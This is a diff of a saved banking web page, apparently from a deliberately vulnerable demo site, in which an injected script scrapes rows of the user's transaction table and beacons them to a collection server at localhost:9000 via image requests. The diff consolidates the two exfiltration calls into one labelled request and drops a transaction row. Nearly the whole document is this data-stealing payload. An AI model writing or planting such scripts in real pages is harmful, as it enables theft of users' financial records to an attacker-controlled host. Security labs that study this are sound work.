@@ -19,10 +19,7 @@
         
     
             <tr><td>13842</td><td>2019-11-07 18:59</td><td>800000</td><td>Withdrawal</td><td align="right">-$1.00</td></tr>
-        
-    
-            <tr><td>13652</td><td>2019-11-07 18:38</td><td>800000</td><td>Withdrawal</td><td align="right">-$3.00</td></tr>
-        
+                
     <tr>
     
         </tr>
@@ -37,9 +34,7 @@
             var a = document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(1)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(1)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(2)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(2)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(3)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(3)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(4)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(4)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(5)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(5)").textContent;
             var b = document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(1)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(1)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(2)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(2)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(3)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(3)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(4)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(4)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(5)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(5)").textContent;
 
-            new Image().src = 'http://localhost:9000/?'+ a;
-            new Image().src = 'http://localhost:9000/?'+ b;
-
+            new Image().src = 'http://localhost:9000/?'+ ' TRANSACTION1 ' + a + ' TRANSACTION2 ' + b;
             return(true);             
         }
     </script>
